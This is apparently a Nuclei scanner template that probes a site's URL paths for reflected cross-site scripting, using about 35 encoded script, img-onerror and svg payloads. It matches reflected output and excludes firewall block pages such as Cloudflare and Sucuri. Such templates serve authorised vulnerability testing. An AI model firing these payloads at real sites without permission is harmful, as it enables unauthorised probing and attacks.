id: path-xss-with-extensions

info:
  name: XSS In Path with extensions
  author: reewardius
  severity: medium
  tags: xss,generic

http:
  - method: GET
    path:
      - "{{BaseURL}}/#<script>alert(1)</script>"
      - "{{BaseURL}}/%27%29%7D%3B\"><img src=123 onerror=alert(1)>//"
      - "{{BaseURL}}/%27%29%29%7D%7D%3B\"><img src=123 onerror=alert(1)>//"
      - "{{BaseURL}}/%27%29%29%29%7D%7D%7D%3B\"><img src=123 onerror=alert(1)>//"
      - "{{BaseURL}}/%27%7D%7D%7D%3B\"><img src=123 onerror=alert(1)>//"
      - "{{BaseURL}}/%22%3E%3Cimg src%3D123 onerror%3Dalert%281%29%3E"
      - "{{BaseURL}}/%22%3E%3Cimg src=x onerror=alert(1)%3E"
      - "{{BaseURL}}/%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
      - "{{BaseURL}}/</script><script>alert(1)</script>"
      - "{{BaseURL}}/<script>alert(1)</script>"
      - "{{BaseURL}}/<svg><animatetransform onbegin=alert(1)>"
      - "{{BaseURL}}/]--><script>alert(1)</script>"
      - '{{BaseURL}}/\"><details open ontoggle=confirm`1`>'
      - '{{BaseURL}}/\"><h1><img src=x onerror=alert(1)>'
      - '{{BaseURL}}/\"><img src=123 onerror=alert(1)>'
      - '{{BaseURL}}/\"><img src=123 onerror=alert(1)>//'
      - '{{BaseURL}}/\"><script>alert(1)</script>'
      - '{{BaseURL}}/\"><script>alert(1)</script>.aspx'
      - '{{BaseURL}}/\"><script>alert(1)</script>.html'
      - '{{BaseURL}}/\"><script>alert(1)</script>.jsp'
      - '{{BaseURL}}/\"><script>alert(1)</script>.php'
      - '{{BaseURL}}/\"><script>alert(1)</script>.png'
      - '{{BaseURL}}/\"><svg><animatetransform onbegin=alert(1)>'
      - '{{BaseURL}}/%00<img src=x onerror="prompt(1)">'
      - '{{BaseURL}}/%22%3E%3Cimg src=123 onerror=alert(1)%3E/'
      - '{{BaseURL}}/%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E.html'
      - '{{BaseURL}}/%3E%3Cimg src=x onerror=alert(1)>'
      - '{{BaseURL}}/../../../lxk6g"><script>alert(1)</script>lxk6g'
      - '{{BaseURL}}/;<img src=123 onerror=alert(1)>'
      - '{{BaseURL}}/</script>\"><img src=x onerror=prompt(1)>.html'
      - '{{BaseURL}}/<img src=x onerror="prompt(1)">.php'
      - '{{BaseURL}}/\"><img src=x onerror="prompt(1)">'
      - '{{BaseURL}}/index.php/<img src=x onerror="prompt(1)"/index.php'
      - '{{BaseURL}}/lxk6g"><script>alert(1)</script>lxk6g'
      - '{{BaseURL}}/something?</script><img src=x onerror=prompt(1)>'
      
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<img src=x onerror="prompt(1)"'
          - '<img src=x onerror=prompt(1)'
          - "<img src=123 onerror=alert(1)"
          - "<script>alert(1)</script>"
          - "-confirm(document.domain)-"
          - "<details open ontoggle=confirm`1`"
          - "<svg><animatetransform onbegin=alert(1)>"
          - "<img src=x onerror=alert(1)>"
        condition: or
        
      - type: word
        part: header
        words:
          - text/html
        
      - type: word
        words:
          - "Access Denied"
          - "Error 1006"
          - "Cloudflare"
          - "Incapsula incident ID"
          - "The requested URL was rejected. Please consult"
          - "you have been blocked"
          - "You don't have permission to access"
          - "Generated by cloudfront"
          - "Sucuri WebSite Firewall - Access Denied"
        condition: or
        part: body
        negative: true